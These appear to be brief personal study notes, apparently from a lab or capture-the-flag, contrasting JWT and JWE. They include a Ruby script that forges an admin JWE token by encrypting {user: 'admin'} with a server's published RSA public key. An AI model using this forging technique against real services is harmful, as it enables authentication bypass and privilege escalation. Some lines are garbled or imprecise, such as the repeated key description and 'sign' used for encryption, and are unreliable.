 - in jwt , payload can be seen by anyone by base64 decoding

- in jwe . payload data is encrypted , cannot see unless decrypted


Two keys are used :
- A key to encrypt the `body`: the `Content Encryption Key` (`CEK`).
- A key to encrypt: the `Content Encryption Key`


# STRUCTURE

![[Pasted image 20250528182922.png]]

- `Encrypt(CEK, public_key)`:  `CEK` encrypted using the `public_key`. specified as `alg`
- `Encrypt(Data, CEK)`:  `data` encrypted using `CEK`specified as `enc`



# EXPLOIT

```
require 'jwe'
require 'openssl'
require 'json'

public_key_pem = <<~PEM
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA66BEnFnKRA7C3DR5cMqL
D+5KYyiSFrBkpf3uundWvQopYdgVR/NxpB6I2yDUjR8tx9y2BJYc6XtZp42o/hq+
7ZV18/lMWJITzRcB1K2bDsJ+qw4F3Y/voMobyRcSn1x3b95bj5l+S725zaxEMeOQ
FQEsgY3PA4YsZnPk22fxrp36G+KOKbuooM1VRUzptOsoabf6gTAfKf6MZVWU2OMx
kM3LN4SJhHVf0JI7vy9nK62qeygIWL+KLCmKywI74Je5zsaXja931vnJGzF6wmqc
ptm2btTX3WdTwoSZ6HvkGumPG0TiU6BbDSSiBuxn/CAnFe0t9eZWpSViWTCWqopQ
FQIDAQAB
-----END PUBLIC KEY-----
PEM

key = OpenSSL::PKey::RSA.new(public_key_pem)

payload = { user: "admin" }.to_json
puts JWE.encrypt(payload, key, enc: 'A192GCM')

```

- sign with public key byguessing the payload as `{user:"admin"}` 
- public key is given to users publicly


